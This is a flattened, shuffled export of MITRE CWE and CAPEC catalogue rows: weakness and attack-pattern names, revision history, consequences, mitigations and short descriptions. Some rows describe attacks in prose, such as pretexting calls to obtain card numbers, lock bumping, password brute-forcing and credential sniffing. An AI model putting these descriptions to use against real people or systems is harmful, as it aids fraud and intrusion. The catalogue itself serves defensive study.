7471	39	2008-09-08
8577	53	The MITRE Corporation
13518	100	The MITRE Corporation
10335	46	The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the program violates the following EJB guideline: "The enterprise bean must not attempt to create a class loader; obtain the current class loader; set the context class loader; set security manager; create a new security manager; stop the JVM; or change the input, output, and error streams." The specification justifies this requirement in the following way: "These functions are reserved for the EJB container. Allowing the enterprise bean to use these functions could compromise security and decrease the container's ability to properly manage the runtime environment."
12295	100	The MITRE Corporation
13240	78	High
11724	39	2008-07-01
6229	62	updated Common_Consequences
14566	69	Draft
9523	61	Draft
22942	81	Other
19860	45	Variant
8874	62	updated Taxonomy_Mappings
22165	39	2019-01-03
24449	69	Draft
8602	39	2010-04-05
11195	28	CWE Content Team
17824	39	2008-07-01
13467	42	Ensure that no casts, implicit or explicit, take place that move from a larger size primitive or a smaller size primitive.
6067	62	updated Other_Notes, Potential_Mitigations, Research_Gaps
16014	93	High
10170	47	Execute Unauthorized Commands
11805	47	Gain Privileges
20763	62	updated Relationships, Taxonomy_Mappings
18060	103	Primary
21097	44	High
17317	39	2011-06-01
13513	88	Permissive Regular Expression
22319	62	updated Relationships
24604	62	updated Common_Consequences
13214	31	1000
9164	35	MITRE
13880	90	Language-Independent
23295	39	2019-01-03
19335	35	MITRE
13085	39	2008-09-08
16430	101	CAPEC Content Team
17854	31	1000
24723	63	Read Application Data
15013	28	CWE Content Team
25368	92	Experiment
9293	79	Access Control
23242	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
17984	66	XXE (Xml eXternal Entity) Attack
22195	45	Compound
18480	39	2011-06-01
10224	42	Regular expressions can become error prone when defining a complex language even for those experienced in writing grammars. Determine if several smaller regular expressions simplify one large regular expression. Also, subject your regular expression to thorough testing techniques such as equivalence partitioning, boundary value analysis, and robustness. After testing and a reasonable confidence level is achieved, a regular expression may not be foolproof. If an exploit is allowed to slip through, then record the exploit and refactor your regular expression.
13942	28	CWE Content Team
11348	78	High
16359	74	1
15324	33	Riyaz Ahemed Walikar
24012	33	Yunhui Long
12048	91	Testing
14845	39	2008-09-08
11676	39	2009-12-28
25375	91	Installation
15383	91	Architecture and Design
16481	81	Access Control
9839	66	Race Condition: Signal Handling
13107	78	High
10380	102	CanPrecede
21510	31	1000
16057	78	Very High
14886	35	MITRE
15150	47	Gain Privileges
22623	43	Simple
22612	62	updated Relationships
9049	91	Implementation
11255	62	updated Relationships
14579	86	http://vulncat.fortifysoftware.com
9266	28	CWE Content Team
13021	53	The MITRE Corporation
13323	50	Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding.
13062	28	CWE Content Team
19363	56	ChildOf
15562	50	Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.
6114	28	CWE Content Team
10653	59	Updated Related_Attack_Patterns
5634	104	681
8113	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
21751	62	added/updated demonstrative examples
23394	73	Find unpublished credentails to access service.
10309	60	16
11780	76	2019-09-30
6979	47	Modify Data
25428	62	added/updated demonstrative examples
11328	62	updated Relationships, Taxonomy_Mappings
18545	28	CWE Content Team
15145	39	2011-03-29
24036	50	Ensure proper permissions on directories that are accessible through a web server. Disallow remote access to the web root. Disable execution on directories within the web root. Ensure that permissions of the web server process are only what is required by not using built-in accounts and instead create specific accounts to limit unnecessary access or permissions overlap across multiple systems.
20125	62	updated Demonstrative_Examples, Description
16555	35	MITRE
18751	35	KDM Analytics
23614	28	CWE Content Team
14633	35	MITRE
16504	62	updated Potential_Mitigations
15588	91	Architecture and Design
13678	35	MITRE
19692	40	The adversary needs logical access to the target network. XMAS scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.
23099	31	1000
22892	53	The MITRE Corporation
10974	43	Simple
16619	23	An attacker uses a bump key to force a lock on a building or facility and gain entry. Lock Bumping is the use of a special type of key that can be tapped or bumped to cause the pins within the lock to fall into temporary alignment, allowing the lock to be opened. Lock bumping allows an attacker to open a lock without having the correct key. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A bump key is a specially constructed key that exploits this design. When the bump key is struck or firmly tapped, its teeth transfer the force of the tap into the key pins, causing the lock to momentarily shift into proper alignment for the mechanism to be opened.
23023	55	CAPEC Content Team
21200	39	2012-10-30
24483	94	Run Arbitrary Code
11660	69	Incomplete
15830	101	CAPEC Content Team
10486	62	updated Relationships, Taxonomy_Mappings
17057	56	ChildOf
8320	39	2017-11-08
17174	94	By faking the source of data or services, an adversary can cause a target to make incorrect decisions about how to proceed.
16171	39	2008-10-14
16164	63	Gain Privileges or Assume Identity
13559	51	2014-06-23
14399	26	Implementation
17651	102	ChildOf
23337	62	updated Potential_Mitigations
18513	47	Read Data
12018	62	updated Relationships
23192	72	An attacker could provide unexpected values and cause a program crash or excessive consumption of resources, such as memory and CPU.
18045	45	Base
24180	89	Detailed
16461	26	Architecture and Design
15477	35	MITRE
25028	28	CWE Content Team
7125	39	2012-05-11
19725	66	Halstead complexity measures
17172	91	Architecture and Design
17376	24	MITRE
8828	55	CAPEC Content Team
10634	28	CWE Content Team
6001	97	Email Injection
19551	62	updated Applicable_Platforms, Enabling_Factors_for_Exploitation, Observed_Examples, Relationships
20473	35	MITRE
6044	35	MITRE
23976	35	MITRE
19347	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
10570	62	updated Potential_Mitigations, Time_of_Introduction
18845	62	updated Demonstrative_Examples, Maintenance_Notes, Observed_Examples, Relationships
18360	81	Availability
9692	100	The MITRE Corporation
25347	36	http://netifera.com/research/flickr_api_signature_forgery.pdf
17145	45	Variant
22143	28	CWE Content Team
20990	95	[File misclassification shotgunning] An attacker makes changes to file extensions and MIME types typically processed by web servers and looks for abnormal behavior.
6392	62	updated Relationships
6264	91	Implementation
8139	21	CWE Content Team
25412	28	CWE Content Team
24264	62	updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, Relationships, White_Box_Definitions
25045	101	CAPEC Content Team
14650	28	Eric Dalci
7100	81	Other
5796	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
6298	39	2012-05-11
10848	28	CWE Content Team
18314	103	Primary
13557	39	2012-05-11
21701	39	2008-07-01
8586	62	updated Applicable_Platforms
14023	62	updated Relationships
12712	35	MITRE
11472	56	ChildOf
17766	92	Exploit
7992	28	CWE Content Team
8526	69	Incomplete
10193	97	XSS Targeting HTML Attributes
7181	39	2012-10-30
24366	23	An adversary engages in pretexting behavior, assuming the role of someone who works for Customer Service, to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. One example of a scenario such as this would be to call an individual, articulate your false affiliation with a credit card company, and then attempt to get the individual to verify their credit card number.
19923	23	This attack targets the encoding of the Slash characters. An attacker would try to exploit common filtering problems related to the use of the slashes characters to gain access to resources on the target host. Directory-driven systems, such as file systems and databases, typically use the slash character to indicate traversal between directories or other container components. For murky historical reasons, PCs (and, as a result, Microsoft OSs) choose to use a backslash, whereas the UNIX world typically makes use of the forward slash. The schizophrenic result is that many MS-based systems are required to understand both forms of the slash. This gives the attacker many opportunities to discover and abuse a number of common filtering problems. The goal of this pattern is to discover server software that only applies filters to one version, but not the other.
11802	103	Primary
5680	62	updated Description, Name
10234	28	CWE Content Team
16829	56	ChildOf
9671	45	Class
6664	91	Operation
16879	39	2012-05-11
11618	56	ChildOf
18756	104	548
6095	56	ChildOf
10638	39	2008-09-08
20842	97	Session Credential Falsification through Prediction
13999	79	Confidentiality
13931	62	updated Common_Consequences
19240	101	CAPEC Content Team
12724	59	Updated Related_Attack_Patterns, Type (Relationship -> Attack_Pattern)
16022	28	CWE Content Team
23816	103	Primary
11877	52	Automated dynamic analysis may not be able to find interfaces that are protected by authorization checks, even if those checks contain weaknesses.
5672	39	2019-09-19
12239	42	Do not use the Class Loader when writing EJBs.
23874	77	Manual Static Analysis - Binary or Bytecode
19424	79	Confidentiality
15143	76	2018-07-31
15215	28	CWE Content Team
13445	88	Obsolete Feature in UI
10323	81	Integrity
7810	28	CWE Content Team
25285	66	Cross-domain policy for Flash movies
12296	97	HTTP DoS
10934	69	Incomplete
20965	28	CWE Content Team
9754	79	Authentication
17562	78	Medium
12077	47	Execute Unauthorized Commands
7927	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
9739	35	MITRE
16891	39	2014-07-30
7500	62	updated Observed_Examples, Relationships
12649	42	Avoid race conditions (CWE-362) during initialization routines.
15876	39	2014-07-30
11116	39	2009-05-27
8342	62	updated Demonstrative_Examples
15131	103	Primary
9221	42	Turn off dangerous handlers when performing sensitive operations.
17627	35	MITRE
20700	104	528
13766	28	CWE Content Team
18228	91	Implementation
9769	57	Primary
18452	102	ChildOf
20674	103	Primary
19845	28	CWE Content Team
11650	28	CWE Content Team
17424	39	2012-10-30
20029	62	updated Common_Consequences, Relationships, Observed_Example
14510	39	2017-11-08
22968	28	CWE Content Team
13057	62	updated References
7246	62	updated Relationships
5922	35	MITRE
20689	90	Language-Independent
24405	35	MITRE
6540	28	CWE Content Team
11244	28	CWE Content Team
19798	62	updated Description, Other_Notes, References
18633	35	MITRE
16525	39	2017-11-08
15634	56	ChildOf
23618	40	Transparent proxy is usedVulnerable configuration of network topology involving the transparent proxy (e.g., no NAT happening between the client and the proxy)Execution of malicious Flash or Applet in the victim's browser
15985	28	CWE Content Team
12666	103	Primary
23942	35	MITRE
11053	63	Unexpected State
22289	85	144
24157	28	CWE Content Team
13666	51	2014-06-23
9095	45	Base
17734	63	Modify Application Data
20035	100	The MITRE Corporation
11097	63	Read Application Data
24702	39	2019-09-19
20077	39	2008-07-01
23570	62	updated Taxonomy_Mappings
15789	28	CWE Content Team
8689	35	MITRE
6606	101	CAPEC Content Team
17111	102	ChildOf
7459	56	ChildOf
19398	35	MITRE
16015	74	1
8503	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer
23187	62	updated Description
8694	35	MITRE
22082	81	Non-Repudiation
10071	103	Primary
12163	91	Requirements
6824	62	updated Relationships
12876	101	CAPEC Content Team
8052	42	Use OS-level preventative functionality integrated after the fact. Not a complete solution.
16766	43	Simple
24765	39	2009-12-28
10855	91	Implementation
12373	72	It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to escalate an attacker's privileges to an administrative level.
18310	35	MITRE
9834	104	327
16534	39	2009-01-12
5748	28	CWE Content Team
6398	79	Integrity
8451	23	This attack relies on the attacker using unexpected formats for representing IP addresses. Networked applications may expect network location information in a specific format, such as fully qualified domains names (FQDNs), URL, IP address, or IP Address ranges. If the location information is not validated against a variety of different possible encodings and formats, the adversary can use an alternate format to bypass application access control.
14070	105	Mobile
7956	53	The MITRE Corporation
16751	63	DoS: Crash, Exit, or Restart
15050	89	Detailed
20534	91	Operation
10227	39	2017-11-08
21899	39	2017-11-08
8717	35	MITRE
19842	72	An attacker might be able to gain advantage over other users by performing the action multiple times, or affect the correctness of the software.
10020	100	The MITRE Corporation
5590	74	3
10825	28	CWE Content Team
12186	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Relationships
6100	73	Obtain list of authorized users using another attack pattern, such as SQL Injection.
11320	101	CAPEC Content Team
19491	63	Modify Application Data
13799	28	CWE Content Team
7894	44	High
16688	50	Design: Follow the defensive programming practices needed to protect an application accessing the database from SQL injection                Configuration: Ensure that the DBMS is patched with the latest security patches                Design: Ensure that the DBMS login used by the application has the lowest possible level of privileges in the DBMS                Design: Ensure that DBMS runs with the lowest possible level of privileges on the host machine and that it runs as a separate user                Usage: Do not use the DBMS machine for anything else other than the database                Usage: Do not place any trust in the database host on the internal network. Authenticate and validate all network activity originating from the database host.                Usage: Use an intrusion detection system to monitor network connections and logs on the database host.                Implementation: Remove / disable all unneeded / unused functions of the DBMS system that may allow an attacker to elevate privileges if compromised
8047	28	CWE Content Team
17134	31	700
14239	78	Low
15827	23	The software makes invalid assumptions about how protocol data or memory is organized at a lower level, resulting in unintended program behavior.
11902	91	Testing
11619	76	2018-07-31
6046	42	For EJB, use framework approaches for parallel execution, instead of using threads.
6113	28	CWE Content Team
5831	63	Read Memory
9977	35	MITRE
25161	36	http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/character-encoding.html
15595	69	Draft
8527	63	Quality Degradation
10598	56	ChildOf
24625	39	2009-05-27
9590	31	1000
24353	42	If you must support older PHP versions, write your own version of is_uploaded_file() and run it against $HTTP_POST_FILES['userfile']))
13231	53	The MITRE Corporation
9765	35	MITRE
10753	88	Missing Reference to Active Allocated Resource
23465	69	Incomplete
10161	25	Low
23130	44	High
19150	85	586
22752	35	MITRE
15850	88	Missing Custom Error Page
12780	35	MITRE
24098	81	Integrity
21272	28	CWE Content Team
24977	86	http://www.owasp.org/index.php/Relative_Path_Traversal
10328	35	MITRE
24242	21	Anonymous Tool Vendor (under NDA)
15357	91	Implementation
13304	39	2019-06-20
16192	62	updated Related_Attack_Patterns
16607	81	Integrity
15829	35	MITRE
22267	31	1000
13186	56	ChildOf
19241	28	CWE Content Team
14893	88	Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')
13133	89	Meta
14321	35	MITRE
5863	35	MITRE
20210	39	2008-09-08
8541	62	updated Relationships
12664	63	Unexpected State
13521	81	Integrity
21942	62	updated Relationships
6116	39	2009-12-28
24365	39	2008-09-08
6635	61	Draft
21921	96	2018-07-02
6486	35	MITRE
22182	100	The MITRE Corporation
15496	59	Updated Related_Attack_Patterns
20368	35	MITRE
10973	31	1003
12986	51	2015-11-09
17425	53	The MITRE Corporation
5794	76	2019-09-30
15135	35	MITRE
21473	70	Evercookie
6441	31	1000
19146	63	Read Application Data
24183	28	CWE Content Team
22276	63	Modify Memory
8580	62	updated Relationships, Taxonomy_Mappings
23430	26	Implementation
25292	62	updated Observed_Examples, References, Relationships
21791	39	2013-07-17
23763	35	MITRE
15626	50	Carefully review the service's implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as buffer overflow.
12344	70	Bit9 and Our Customers’ Security
17962	25	High
24882	85	330
7333	39	2009-07-27
6430	35	MITRE
20108	28	CWE Content Team
15695	62	updated References, Relationships
8050	63	Bypass Protection Mechanism
11257	39	2008-10-14
19128	28	CWE Content Team
11474	35	MITRE
19504	79	Confidentiality
15671	56	ChildOf
11918	79	Authorization
19401	35	MITRE
10713	63	Unexpected State
15041	62	updated Weakness_Ordinalities
19556	35	MITRE
9583	86	http://www.omg.org/spec/ASCRM/1.0/
14734	56	ChildOf
17045	28	CWE Content Team
20019	26	Implementation
9140	21	7 Pernicious Kingdoms
10969	72	It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to claim a high level of authorization, or to claim that successful authentication has occurred.
20196	28	CWE Content Team
6029	74	1
24804	46	Not properly handling virtual filenames (e.g. AUX, CON, PRN, COM1, LPT1) can result in different types of vulnerabilities. In some cases an attacker can request a device via injection of a virtual filename in a URL, which may cause an error that leads to a denial of service or an error page that reveals sensitive information. A software system that allows device names to bypass filtering runs the risk of an attacker injecting malicious code in a file with the name of a device.
9404	44	High
13875	23	An attacker takes advantage of the structure of integer variables to cause these variables to assume values that are not expected by an application. For example, adding one to the largest positive integer in a signed integer variable results in a negative number. Negative numbers may be illegal in an application and the application may prevent an attacker from providing them directly, but the application may not consider that adding two positive numbers can create a negative number do to the structure of integer storage formats.
6355	62	updated Applicable_Platforms
9294	69	Incomplete
13343	28	CWE Content Team
12295	59	Updated Attack_Phases
21172	89	Standard
15854	62	updated Detection_Factors
12897	78	Low
9068	55	CAPEC Content Team
14345	39	2014-07-30
16323	73	Use web browser to inject input through text fields or through HTTP GET parameters.
18985	51	2014-06-23
7166	39	2013-02-21
25120	42	Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.                   When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.                   Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).
23384	81	Integrity
12506	30	Fortify Software
13140	39	2008-07-01
23311	28	CWE Content Team
19560	30	Adi S.
13624	67	High
10961	35	MITRE
18411	39	2008-07-01
16901	28	CWE Content Team
6635	40	The target application must store sensitive information in a cache.
11791	39	2019-01-03
23803	100	The MITRE Corporation
18571	102	ChildOf
22161	23	An adversary registers a domain name with at least one character different than a trusted domain. A TypoSquatting attack takes advantage of instances where a user mistypes a URL (e.g. www.goggle.com) or not does visually verify a URL before clicking on it (e.g. phishing attack). As a result, the user is directed to an adversary-controlled destination. TypoSquatting does not require an attack against the trusted domain or complicated reverse engineering.
10491	39	2014-02-18
20013	90	XML
11421	35	MITRE
7684	62	updated Potential_Mitigations
24435	89	Detailed
19811	63	Read Application Data
7543	21	PLOVER
21857	104	357
6375	39	2009-10-29
21400	35	MITRE
16273	28	CWE Content Team
24739	56	ChildOf
10085	90	Language-Independent
11143	39	2010-06-21
13380	62	updated Relationships, Taxonomy_Mappings
8507	35	MITRE
6238	28	CWE Content Team
15198	104	781
20778	103	Primary
24933	39	2019-01-03
21705	100	The MITRE Corporation
15361	35	MITRE
24204	43	Simple
15288	103	Primary
19346	63	Read Memory
20004	31	1000
23013	39	2009-03-10
24466	95	[Connect or deceive a user into connecting the infected USB device] Once the malware has been placed on an external USB device, the adversary connects the device to the target system or deceives a user into connecting the device to the target system such as in a USB Drop Attack.
25331	103	Primary
15189	39	2019-01-03
19941	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
21358	39	2008-07-01
24804	45	Variant
14331	62	updated Potential_Mitigations
6903	35	MITRE
14174	39	2011-03-29
22231	72	Strings that are not initialized are especially dangerous, since many functions expect a null at the end -- and only at the end -- of a string.
5661	31	699
23177	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).
17946	62	updated Modes_of_Introduction, Relationships, Relationship_Notes, Taxonomy_Mappings
9873	69	Incomplete
25434	62	updated Other_Notes, Potential_Mitigations
23011	39	2014-07-30
5907	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
9906	42	Use an authentication framework or library such as the OWASP ESAPI Authentication feature.
15992	56	ChildOf
22724	28	CWE Content Team
17266	33	Alfred J. Menezes
20164	76	2017-05-01
9355	43	Simple
13961	28	CWE Content Team
7754	39	2011-06-01
15723	44	High
25213	28	CWE Content Team
12193	39	2008-09-08
15460	61	Draft
15631	35	MITRE
20257	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
9766	103	Primary
19755	55	CAPEC Content Team
17276	60	05
12670	104	102
16243	42	Ensure that the software runs properly under the Federal Desktop Core Configuration (FDCC) [REF-199] or an equivalent hardening configuration guide, which many organizations use to limit the attack surface and potential risk of deployed software.
6466	62	updated References, Relationships
20870	66	Understanding DEP as a mitigation technology part 1
14069	42	Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.
11463	39	2017-11-08
15944	103	Primary
10429	77	Manual Static Analysis
24461	76	2015-12-07
13197	26	Architecture and Design
23967	39	2008-09-08
14193	56	ChildOf
12313	62	updated Relationships
16836	103	Primary
21674	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer
15117	62	updated Potential_Mitigations, Time_of_Introduction
23162	46	Capture-replay attacks are common and can be difficult to defeat without cryptography. They are a subset of network injection attacks that rely on observing previously-sent valid commands, then changing them slightly if necessary and resending the same commands to the server.
19058	91	Requirements
10395	100	The MITRE Corporation
21707	39	2009-12-28
16874	35	MITRE
17966	76	2018-07-31
12469	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
8224	81	Availability
9033	62	updated Relationships
11718	69	Incomplete
5866	35	MITRE
10857	90	Language-Independent
10102	39	2009-10-29
17416	47	Modify Data
21125	35	MITRE
20259	62	updated Common_Consequences, References, Relationships
9972	28	CWE Content Team
14831	101	CAPEC Content Team
17819	35	Cigital
21220	35	MITRE
10758	28	CWE Content Team
24422	28	CWE Content Team
21379	28	CWE Content Team
25388	56	ChildOf
14466	28	CWE Content Team
16525	62	updated Applicable_Platforms, Taxonomy_Mappings
20887	88	Buffer Under-read
8729	53	The MITRE Corporation
13550	23	This attack utilizes a REST(REpresentational State Transfer)-style applications' trust in the system resources and environment to obtain sensitive data once SSL is terminated. Rest applications premise is that they leverage existing infrastructure to deliver web services functionality. An example of this is a Rest application that uses HTTP Get methods and receives a HTTP response with an XML document. These Rest style web services are deployed on existing infrastructure such as Apache and IIS web servers with no SOAP stack required. Unfortunately from a security standpoint, there frequently is no interoperable identity security mechanism deployed, so Rest developers often fall back to SSL to deliver security. In large data centers, SSL is typically terminated at the edge of the network - at the firewall, load balancer, or router. Once the SSL is terminated the HTTP request is in the clear (unless developers have hashed or encrypted the values, but this is rare). The attacker can utilize a sniffer such as Wireshark to snapshot the credentials, such as username and password that are passed in the clear once SSL is terminated. Once the attacker gathers these credentials, they can submit requests to the web service provider just as authorized user do. There is not typically an authentication on the client side, beyond what is passed in the request itself so once this is compromised, then this is generally sufficient to compromise the service's authentication scheme.
13216	62	updated Relationships, Taxonomy_Mappings
17052	28	CWE Content Team
9691	46	If a system does not follow the chain of trust of a certificate to a root server, the certificate loses all usefulness as a metric of trust. Essentially, the trust gained from a certificate is derived from a chain of trust -- with a reputable trusted entity at the end of that list. The end user must trust that reputable source, and this reputable source must vouch for the resource in question through the medium of the certificate.             In some cases, this trust traverses several entities who vouch for one another. The entity trusted by the end user is at one end of this trust chain, while the certificate-wielding resource is at the other end of the chain. If the user receives a certificate at the end of one of these trust chains and then proceeds to check only that the first link in the chain, no real trust has been derived, since the entire chain must be traversed back to a trusted source to verify the certificate.             There are several ways in which the chain of trust might be broken, including but not limited to:                                                Any certificate in the chain is self-signed, unless it the root.                   Not every intermediate certificate is checked, starting from the original certificate all the way up to the root certificate.                   An intermediate, CA-signed certificate does not have the expected Basic Constraints or other important extensions.                   The root certificate has been compromised or authorized to the wrong party.
19650	23	A software system that accepts path input in the form of trailing slash ('filedir/') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
14806	35	MITRE
16311	25	High
13528	35	MITRE
22547	103	Primary
21372	92	Explore
7668	74	3
6655	62	updated Related_Attack_Patterns
7056	47	Execute Unauthorized Commands
18315	35	MITRE
11532	35	MITRE
17220	35	MITRE
22583	101	CAPEC Content Team
21027	28	CWE Content Team
19751	62	updated Time_of_Introduction
5614	35	MITRE
6657	31	699
14354	35	MITRE
17008	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
20267	35	MITRE
24701	28	CWE Content Team
11057	103	Primary
18055	62	updated Name
23967	35	MITRE
17732	69	Draft
19007	28	CWE Content Team
13498	25	High
9999	42	Set sessions/credentials expiration date.
15175	81	Integrity
18024	62	updated Common_Consequences
20739	23	The code does not explicitly delimit a block that is intended to contain 2 or more statements, creating a logic error.
23377	94	Attacks that successfully incentivize the target into performing an action beneficial to the adversary can result in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.
25250	102	ChildOf
12308	31	1000
9040	56	ChildOf
19269	78	Medium
23466	28	CWE Content Team
7244	44	SOAR Partial
16292	81	Availability
6101	21	PLOVER
18608	103	Primary
22284	28	Eric Dalci
21361	89	Standard
21801	62	added/updated demonstrative examples
21495	79	Confidentiality
12416	35	MITRE
21916	45	Base
24511	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
15080	62	updated Relationships
17857	35	MITRE
24631	80	The attacker needs to have knowledge of Flash, especially how to insert content the executes commands.
18946	79	Access Control
20707	55	CAPEC Content Team
20781	59	Updated Related_Weaknesses
14532	73	Research popular or high traffic websites.
13869	103	Primary
24281	102	ChildOf
18759	39	2008-10-14
10905	31	699
15766	60	19
24957	69	Draft
25149	59	Updated Description Summary, References
20102	42	Perform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.
20704	62	updated Demonstrative_Examples, Description
16589	27	The Attacker needs the ability to probe application functionality and provide it erroneous directives or data without triggering intrusion detection schemes or making enough of an impact on application logging that steps are taken against the attacker.                The Attack does not need special hardware, software, skills, or access.
9027	50	Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.
6844	39	2008-07-01
15184	28	CWE Content Team
20785	26	Architecture and Design
9883	39	2011-06-01
18434	28	CWE Content Team
10062	47	Modify Data
8314	28	CWE Content Team
17768	101	CAPEC Content Team
17686	70	Security breach stopped
14501	39	2017-11-08
20259	39	2012-05-11
22780	81	Authentication
20174	47	Gain Privileges
12517	39	2012-05-11
12222	39	2014-07-30
6846	35	Cigital
11068	102	ChildOf
9389	72	If the uninitialized pointer is used in a read operation, an attacker might be able to read sensitive portions of memory.
10207	28	CWE Content Team
22134	35	MITRE
24729	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Automated Monitored Execution                            Forced Path Execution                            Debugger                            Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
21261	59	Updated References
13644	28	CWE Content Team
12768	62	updated Modes_of_Introduction, Relationships
18371	95	The attacker tries variation and combination of the slashes characters in different encoding format.
6426	62	updated Taxonomy_Mappings
15084	43	Simple
7769	62	updated Alternate_Terms, Name, Observed_Examples, References
15228	39	2014-07-30
23393	23	This attack utilizes the frequent client-server roundtrips in Ajax conversation to scan a system. While Ajax does not open up new vulnerabilities per se, it does optimize them from an attacker point of view. In many XSS attacks the attacker must get a "hole in one" and successfully exploit the vulnerability on the victim side the first time, once the client is redirected the attacker has many chances to engage in follow on probes, but there is only one first chance. In a widely used web application this is not a major problem because 1 in a 1,000 is good enough in a widely used application. A common first step for an attacker is to footprint the environment to understand what attacks will work. Since footprinting relies on enumeration, the conversational pattern of rapid, multiple requests and responses that are typical in Ajax applications enable an attacker to look for many vulnerabilities, well-known ports, network locations and so on.
22649	39	2011-06-01
15674	91	Implementation
9134	39	2017-11-08
18783	35	Cigital
22689	28	CWE Content Team
21366	30	Ofir Arkin
24592	28	CWE Content Team
7794	39	2017-01-19
16254	80	Reverse engineering and cryptanalysis of signature verification algorithm implementation
8297	62	updated Relationships, Taxonomy_Mappings
13883	61	Stable
22644	35	MITRE
13600	43	Simple
13100	21	PLOVER
24929	32	The Open Web Application Security Project (OWASP)
22095	97	BGP Route Disabling
21153	91	Architecture and Design
18700	39	2012-10-30
18843	39	2014-07-30
21539	39	2014-07-30
14070	69	Incomplete
12539	85	459
11225	47	Read Data
17432	45	Variant
24164	39	2012-05-11
16431	43	Simple
7514	76	2017-08-04
15690	32	The Open Web Application Security Project (OWASP)
15211	39	2008-07-01
23344	91	Policy
14639	62	updated Potential_Mitigations
8024	73	Manually or automatically enter all possible passwords through the application/system's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.
7140	35	MITRE
5595	25	Medium
13814	81	Availability
20961	35	MITRE
16109	28	CWE Content Team
14936	88	Logging of Excessive Data
7448	56	ChildOf
24152	35	MITRE
20436	94	Attacks that leverage the principle of liking can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.
6936	27	A packet sniffing tool, such as wireshark, can be used to capture session information.
17635	91	Implementation
21948	52	While fuzzing is typically geared toward finding low-level implementation bugs, it can inadvertently find uncontrolled resource allocation problems. This can occur when the fuzzer generates a large number of test cases but does not restart the targeted software in between test cases. If an individual test case produces a crash, but it does not do so reliably, then an inability to limit resource allocation may be the cause.                   When the allocation is directly affected by numeric inputs, then fuzzing may produce indications of this weakness.
20189	23	The software implements a Singleton design pattern but does not use appropriate locking or other synchronization mechanism to ensure that the singleton class is only instantiated once.
10208	28	CWE Content Team
7058	35	Cigital
12685	31	1000
7882	39	2008-09-08
10476	36	https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-soundsquatting.pdf
8878	26	Implementation
11182	50	Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.
24940	105	Concurrent Systems Operating on Shared Resources
18501	26	Implementation
13880	104	213
